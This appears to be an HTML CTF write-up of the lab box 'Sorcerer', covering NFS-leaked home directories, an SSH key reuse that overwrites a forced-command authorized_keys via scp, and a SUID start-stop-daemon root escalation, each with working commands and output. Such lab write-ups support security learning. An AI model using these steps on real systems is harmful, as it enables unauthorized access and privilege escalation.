@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sorcerer &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Sorcerer</h1>
+    <div class="meta">Target: <code>192.168.176.100</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">NFS</span><span class="tag">SSH</span><span class="tag">SCPWrapper</span><span class="tag">SUID</span><span class="tag">GTFOBins</span><span class="tag">start-stop-daemon</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl3" href="#web-enumeration">Web Enumeration</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#ssh-key-recovery-from-leaked-home-directory">SSH Key Recovery from Leaked Home Directory</a><a class="lvl3" href="#bypassing-the-scp-restriction">Bypassing the SCP Restriction</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#suid-start-stop-daemon">SUID start-stop-daemon</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Sorcerer is a Linux box built around a creative SSH restriction bypass. Exposed NFS shares leak user home directories as ZIP files, one of which contains an SSH private key locked behind an <code>scp_wrapper.sh</code> forced command that blocks interactive shell access. The trick is uploading a modified <code>authorized_keys</code> that strips the wrapper restriction, using the same key over SCP to overwrite it. From there, a SUID <code>start-stop-daemon</code> binary is a trivial GTFOBins escalation to root.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.9p1 Debian
+80/tcp    open  http    nginx
+111/tcp   open  rpcbind
+2049/tcp  open  nfs     3-4 (RPC #100003)
+7742/tcp  open  http    nginx
+8080/tcp  open  http    Apache Tomcat 7.0.4
+34541/tcp open  mountd
+34965/tcp open  nlockmgr
+</code></pre>
+<p>Two web ports and NFS are the interesting findings. Port 7742 hosts the real application; port 8080 runs Apache Tomcat 7.0.4 (old, worth noting).</p>
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>The port 7742 landing page was a login portal with no working default credentials. Gobuster found two directories:</p>
+<pre><code class="language-sh">gobuster dir -u http://192.168.176.100:7742/ -w /home/kali/Tools/SecLists/Discovery/Web-Content/big.txt
+/default   (Status: 301)
+/zipfiles  (Status: 301)
+</code></pre>
+<p><code>/zipfiles</code> immediately surfaces four archives:</p>
+<pre><code>francis.zip
+max.zip
+miriam.zip
+sofia.zip
+</code></pre>
+<p>These are user home directory backups.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="ssh-key-recovery-from-leaked-home-directory">SSH Key Recovery from Leaked Home Directory</h3>
+<p>Max's archive contained the most useful material:</p>
+<pre><code class="language-sh">ls -lah ~/home/max
+drwxr-xr-x  .ssh/
+-rwxr-xr-x  scp_wrapper.sh
+-rw-r--r--  tomcat-users.xml.bak
+</code></pre>
+<p>The <code>.ssh/</code> directory held Max's private key. The <code>authorized_keys</code> file, however, had a forced command applied:</p>
+<pre><code>no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty,command=&quot;/home/max/scp_wrapper.sh&quot; ssh-rsa AAAA...
+</code></pre>
+<blockquote>
+<p><strong>How forced commands restrict SSH:</strong> <code>authorized_keys</code> can bind a key to a specific command with the <code>command=</code> option. When that key authenticates, the server runs <em>only</em> that command instead of a shell. The <code>no-pty</code> flag also blocks TTY allocation, so even if the forced command were a shell it wouldn't be interactive. This is a common lockdown pattern for service accounts, but it only works if the <code>authorized_keys</code> file itself is protected.</p>
+</blockquote>
+<p>The restriction is only enforced while the original <code>authorized_keys</code> is in place. Because the key is usable for SCP, I can overwrite the file.</p>
+<h3 id="bypassing-the-scp-restriction">Bypassing the SCP Restriction</h3>
+<p>Steps:
+1. Copy Max's <code>id_rsa</code> private key locally.
+2. Create a new <code>authorized_keys</code> containing the same public key <em>without</em> the <code>command=</code> restriction.
+3. Use SCP with the original key to overwrite <code>max's</code> <code>authorized_keys</code>:</p>
+<pre><code class="language-sh">chmod 600 id_rsa
+scp -i id_rsa -O authorized_keys max@192.168.176.100:/home/max/.ssh/authorized_keys
+</code></pre>
+<blockquote>
+<p><strong>Why <code>-O</code> matters here:</strong> newer OpenSSH clients default to SFTP protocol for SCP. The forced command on the server only handles the legacy SCP protocol, so adding <code>-O</code> (force legacy mode) ensures the upload actually succeeds rather than stalling on an SFTP negotiation the server won't honor.</p>
+</blockquote>
+<p>SSH now opens a full interactive shell:</p>
+<pre><code class="language-sh">ssh -i id_rsa max@192.168.176.100
+max@sorcerer:~$ whoami
+max
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="suid-start-stop-daemon">SUID start-stop-daemon</h3>
+<p>Enumerating SUID and SGID binaries:</p>
+<pre><code class="language-sh">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt;/dev/null
+-rwsr-xr-x 1 root root 44200 Jun  3  2019 /usr/sbin/start-stop-daemon
+</code></pre>
+<p><code>start-stop-daemon</code> has a GTFOBins entry. It manages daemon processes and can be told to execute an arbitrary command as its payload, inheriting the SUID context:</p>
+<pre><code class="language-sh">/usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
+# whoami
+root
+</code></pre>
+<blockquote>
+<p><strong>Why <code>start-stop-daemon</code> escalates privileges:</strong> the binary is SUID root, meaning the OS runs it with root's effective UID regardless of who calls it. GTFOBins documents that its <code>-x</code> flag specifies the executable to start, and the <code>--</code> separator passes arguments to that binary. The <code>-p</code> flag opens a privileged shell. Because the SUID bit transfers to the spawned process, <code>/bin/sh</code> runs as root.</p>
+</blockquote>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh"># cat proof.txt
+‹redacted›
+
+# find / -type f -name &quot;local.txt&quot; 2&gt;/dev/null
+/home/dennis/local.txt
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>NFS-exposed home directories are treasure chests.</strong> Even read-only leakage of <code>.ssh/</code> directories can give SSH access when the key material is present.</li>
+<li><strong><code>authorized_keys</code> forced commands are only as secure as the file's write permissions.</strong> If SCP can overwrite the file, the restriction evaporates.</li>
+<li><strong>Run <code>find</code> for SUID binaries and cross-reference GTFOBins immediately.</strong> <code>start-stop-daemon</code> is a common find on older Debian/Ubuntu systems and goes root in one command.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
